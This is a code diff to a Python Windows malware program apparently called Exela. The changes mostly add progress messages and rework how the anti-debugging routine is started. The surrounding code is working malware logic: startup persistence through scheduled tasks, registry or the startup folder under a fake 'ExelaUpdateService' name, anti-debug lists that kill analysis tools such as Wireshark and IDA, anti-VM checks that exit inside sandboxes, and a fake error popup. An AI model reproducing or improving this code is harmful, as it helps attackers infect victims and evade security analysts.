@@ -1799,13 +1799,15 @@ class Startup:
         self.ToPath:str = os.path.join(self.LocalAppData, "ExelaUpdateService", "Exela.exe")
     async def main(self) -> None:
         await self.CreatePathAndMelt()
+        print("Started startup injection.")
         if startup_method == "schtasks":
             await self.SchtaskStartup()
         elif startup_method == "regedit":
             await self.RegeditStartup()
         elif startup_method == "folder":
             await self.FolderStartup()
-        else:print("unkown startup method!")
+        else:print("unsupported or unkown startup method!")
+        print(f"Succesfully executed startup injection.")
     async def CreatePathAndMelt(self) -> None:
         try:
             if os.path.exists(self.ToPath): # if the startup file already exist, return
@@ -1901,11 +1903,13 @@ class AntiDebug:
                             "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
         self.banned_process = ["HTTP Toolkit.exe", "httpdebuggerui.exe","wireshark.exe", "fiddler.exe", "regedit.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "ida64.exe", "ollydbg.exe",
                                      "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe", "vmacthlp.exe", "x96dbg.exe", "vmsrvc.exe", "x32dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"]
-        asyncio.run(self.calback())
 
     async def calback(self):
-        await asyncio.gather(self.check_system(), self.kill_process())
-
+        print("Anti Debugging Started.")
+        taskk = [asyncio.create_task(self.check_system()),
+                 asyncio.create_task(self.kill_process())]
+        await asyncio.gather(*taskk)
+        print(f"Anti Debug Succesfully Executed.")
     async def check_system(self) -> None:
         cmd = "wmic csproduct get uuid"
         process = await asyncio.create_subprocess_shell(
@@ -1948,11 +1952,12 @@ class AntiDebug:
                     shell=True)
 
                     await process_list.communicate()
-        except Exception as e:
-            print(f'Hata: {e}')
+        except:
+            pass
 
 class AntiVM:
     async def Main(self) -> None:
+        print("Anti-VM started.")
         taskk = [
             asyncio.create_task(self.CheckGpu()),
             asyncio.create_task(self.CheckHypervisor()),
@@ -1963,7 +1968,7 @@ class AntiVM:
             asyncio.create_task(self.CheckProcess()),]
         results = await asyncio.gather(*taskk)
         if any(results):
-            print("Code running on a VM machine.")
+            print("Anti-VM executed sucesffuly, detected VM machines.")
             try:
                 os._exit(0)
             except:
@@ -1977,7 +1982,7 @@ class AntiVM:
                             exit(0)
                         except:
                             pass
-        print("Code running on a normal machine.")
+        print("Anti-VM executed sucesffuly, do not detected VM machines.")
     async def CheckGpu(self) -> bool:
         try:
             command_output = await asyncio.create_subprocess_shell(
@@ -2089,12 +2094,12 @@ if __name__ == '__main__':
             start_time = time.time()
             if Anti_VM:
                 asyncio.run(AntiVM().Main())
-            AntiDebug()
+            asyncio.run(AntiDebug().calback())
             if not startup_method == "no-startup":
                 asyncio.run(Startup().main())
             asyncio.run(Fakerror())
             main_instance = Main()
             asyncio.run(main_instance.main())
-            print( time.time() - start_time )
+            print(f"The code executed on: {str(time.time() - start_time)} second")
     else:
         print("just Windows Operating system's supported by Exela")
